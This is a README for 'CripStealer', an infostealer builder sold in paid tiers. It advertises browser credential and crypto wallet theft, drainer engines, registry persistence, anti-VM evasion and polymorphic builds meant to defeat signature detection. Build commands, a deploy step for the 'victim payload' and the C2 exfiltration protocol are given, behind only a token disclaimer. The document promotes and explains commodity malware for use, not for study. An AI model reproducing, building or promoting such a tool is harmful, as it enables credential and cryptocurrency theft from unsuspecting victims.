# CripStealer

**A compile-time polymorphic stealer builder that produces fresh, signature-free binaries on every build.**

[🌐 crypter.cloud](https://crypter.cloud) · [🛒 crypter.shop](https://crypter.shop) · [⭐ Premium Tiers](https://crypter.cloud/stealer)

---

## Quick Links

| Resource | URL |
|----------|-----|
| **Main Site** | [crypter.cloud](https://crypter.cloud) |
| **Shop / Buy** | [crypter.shop](https://crypter.shop) |
| **Premium Features** | [crypter.cloud/stealer](https://crypter.cloud/stealer) |

> 🚀 **Tier 2 & 3** add wallet extraction, drainer engines, advanced evasion, and per-build encryption keys. See [crypter.cloud/stealer](https://crypter.cloud/stealer) for full feature comparison and pricing.

---

## What is CripStealer?

CripStealer is a **compile-time polymorphic builder** — every build produces a completely fresh stub, server, and decrypter with:

- **Unique RSA-2048 keypairs** per build
- **Shared AES-256-GCM key** for log encryption
- **Randomized class names** and identifiers
- **3 random high ports** for C2 fallback
- **Roslyn-based string encryption** — no regex hacks, zero corruption
- **No binary patching** — every build is a fresh C# compilation

This means **signature diversity out of the box**. Each binary is structurally unique, making static detection significantly harder.

---

## Features (Tier 1 — Open Source)

| Feature | Details |
|---------|---------|
| **File Grabber** | Targeted extension + keyword matching across Desktop, Documents, Downloads |
| **Browser Extraction** | 100+ Chromium browsers + 30+ Gecko browsers + 60+ wallet extension detection |
| **System Info** | OS version, hostname, username, CPU, RAM, uptime, timezone |
| **Email Scraping** | Regex-based email extraction from collected files |
| **Raw TCP C2** | 3-port fallback with encrypted ZIP exfiltration |
| **AES-256-GCM** | Deflate compression + AES-256-GCM encryption |
| **Stealth Mode** | Optional hidden console window |
| **Persistence** | Optional registry Run key installation |

---

## Quick Start

### Prerequisites
- [.NET SDK 9.0+](https://dotnet.microsoft.com/download)
- Windows

### 1. Clone & Build
```bash
git clone https://github.com/yourusername/CripStealer.git
cd CripStealer
cd Builder
dotnet build -c Release
```

### 2. Generate a Stealer
```bash
dotnet bin/Release/net9.0/Builder-v6.dll --server-ip 192.168.1.100 -o ../output
```

> The builder auto-detects the `Templates/` directory. Override with `--template-dir <path>` if needed.

### 3. Output Files
| File | Purpose |
|------|---------|
| `stub_<buildId>.exe` | Victim payload |
| `server_<buildId>.exe` | C2 listener |
| `decrypter_<buildId>.exe` | Standalone log decryption |

### 4. Run the Server
```bash
cd output
dotnet server_<buildId>.exe
```

### 5. Deploy and Run the Stub
The stub collects data, encrypts it with AES-256-GCM, and sends it to the C2 server via TCP on 3 random fallback ports.

### 6. Find Decrypted Logs
Decrypted ZIP logs are saved to the `logs/` directory next to the server.

---

## Protocol

### Stub → Server (TCP)
```
[4 bytes]   Magic:     0xC5 0xA7 0x3E 0xF1
[1 byte]    Version:   0x01
[16 bytes]  Build ID:  ASCII, null-padded
[4 bytes]   Command:   0x01 = upload
[8 bytes]   Length:    payload length
[N bytes]   Payload:   AES-256-GCM encrypted + deflate compressed ZIP
```

### Encryption
```
Plaintext ZIP
  → DeflateStream compression
  → AES-256-GCM encrypt (per-build key)
  → Magic + Version + Nonce + Tag + Ciphertext
```

---

## Architecture

```
Builder/          .NET 9.0 console app
├── Program.cs              CLI entry point
├── CodeGenerator.cs        Template assembly + macro resolution
├── Compiler.cs             Roslyn CSharpCompilation wrapper
├── TemplateLoader.cs       Recursive .tmpl discovery
├── BuildIdGenerator.cs     Crypto-random 16-char build IDs
├── PortGenerator.cs        3 random high ports
└── Polymorphism/
    └── StringEncryptor.cs  Roslyn syntax-tree string encryption

Templates/
├── Stub/           Client payload
│   ├── Core/       Engine, Config
│   ├── C2/         Raw TCP sender + dispatch fallback
│   ├── Crypto/     LogProtector (AES-256-GCM)
│   └── Grabbers/   Files, SystemInfo, Browsers, EmailScraper
├── Server/         TCP C2 listener + AES-256-GCM decryption
├── Decrypter/      Standalone CLI decrypter
└── Shared/         SecureWipe
```

---

## Tier Comparison

| Feature | Tier 1 (Free) | Tier 2 (Premium) | Tier 3 (Private) |
|---------|--------------|------------------|------------------|
| File grabber | ✓ Targeted | ✓ Deep recursive | ✓ Deep recursive |
| Browser extraction | ✓ 130+ browsers | ✓ All + profile data | ✓ All + decrypted creds |
| System info | ✓ Basic | ✓ Full hardware | ✓ Full hardware |
| Wallet seeds | — | ✓ MetaMask / Phantom / Exodus | ✓ + Bitwarden / 1Password / Proton |
| Drainer engine | — | — | ✓ EVM / Solana / UTXO |
| Anti-VM / anti-debug | — | Advanced | Advanced + integrity |
| String encryption | ✓ AES-CBC | ✓ AES-CBC | ✓ AES-CBC |
| Identifier renaming | ✓ Per-build | ✓ Per-build | ✓ Per-build |
| Junk code insertion | — | — | ✓ Per-build |
| C2 channels | TCP only | TCP + HTTP | TCP + all fallbacks |
| Encryption | AES-256-GCM | AES + RSA + ChaCha | AES + RSA + ChaCha |

> 🔒 **Tier 2 & 3** are available exclusively at [crypter.cloud/stealer](https://crypter.cloud/stealer)

---

## Contributing

Bug reports and pull requests for Tier 1 features are welcome.

For Tier 2/3 inquiries:
- 🌐 [crypter.cloud](https://crypter.cloud)
- 🛒 [crypter.shop](https://crypter.shop)
- ⭐ [crypter.cloud/stealer](https://crypter.cloud/stealer)

---

## Disclaimer

This tool is provided for **educational and authorized security testing purposes only**. The authors assume no liability for misuse.

---

## License

MIT — See [LICENSE](LICENSE).

---

<div align="center">

**Built for reliability. Designed for stealth.**

[🌐 crypter.cloud](https://crypter.cloud) · [🛒 crypter.shop](https://crypter.shop) · [⭐ Premium Tiers](https://crypter.cloud/stealer)

</div>
